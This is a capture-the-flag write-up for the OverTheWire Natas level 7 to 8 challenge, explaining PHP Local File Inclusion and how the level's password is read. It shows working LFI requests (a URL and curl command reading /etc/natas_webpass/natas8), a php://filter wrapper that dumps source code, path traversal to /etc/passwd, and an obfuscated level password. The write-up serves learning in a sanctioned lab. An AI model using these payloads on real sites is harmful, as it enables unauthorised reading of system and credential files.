# Write-up: Natas 07 → 08  
**Date:** 2025-12-07  

## Obfuscated password (ROT13)

`kpbKYzmZxbVC9Q7uytCyu9KQ7BtYNr5D`

## OBJECTIVE

> The level presents two links like:
> 
> - `/index.php?page=home`  
> - `/index.php?page=about`  
>
> A hint hidden on the page states that the password for **natas8** is stored in:
> 
> `/etc/natas_webpass/natas8`

## PURPOSE

The links present on the landing page, `index.php?page=home` and `index.php?page=about`, indicate that the application builds what to include based on the `page` query parameter. This level teaches **Local File Inclusion (LFI)** caused by unsafe use of a user-controlled parameter. The filename or path comes directly from user input (`$_GET["page"]`). There is no proper whitelist, sanitization, or restriction on which file may be loaded. PHP’s `include()` can often be tricked into loading arbitrary files, including files outside the intended directory, if absolute paths or traversal sequences are accepted. PHP’s `include()` is dangerously permissive, yet it would seem that the developer here included something like `include($_GET['page'] . ".php");` inside `index.php`. LFI in PHP has historically allowed attackers to read `/etc/passwd`, SSH keys, configuration files with DB passwords, source code of other PHP files, and even inject PHP and execute code remotely. Modern web stacks generally avoid this entire class of vulnerability, but LFI is alive anywhere that old PHP code still runs. LFI can aslo show up in Python, Flask, Django, and elsewhere. It's a "developer trusted user input" problem. **If user input controls which server-side file gets included, you have an LFI risk.** Even if the developer thinks only “safe” pages will be requested, an attacker can manipulate the parameter to reach more sensitive locations.

## SOLUTIONS

Browser: Navigate to `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

Curl: `curl -u natas7:'<password-for-natas7>' "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"`

## EXPERIMENT

I created an [LFI enumerator](https://github.com/jeremyrayjewell/cyber_journal/tree/main/experiments/lfi-enumerator) to poke around a bit more. Using that I found `php://filter/convert.base64-encode/resource=index.php`, which gave me the base64-encoded source code of `index.php`, which revealed:
```
<?php
    if (array_key_exists("page", $_GET)) {
        include($_GET["page"]);
    }
?>
```
Exactly what was suspected. I was also able to access `../../../../etc/passwd` to see a standard Linux user listing and gain some architectural insights about how the Natas CTF is structured. I also navigated to `?page=/var/www/natas/natas7/index.php`, which produced an interesting infinite recursion of Natas7's page contents. But alas, nothing to bypass the CTF's intended linear progression. On we go!

___

Writeup author: **Jeremy Ray Jewell**  
[GitHub](https://github.com/jeremyrayjewell)  
[LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)
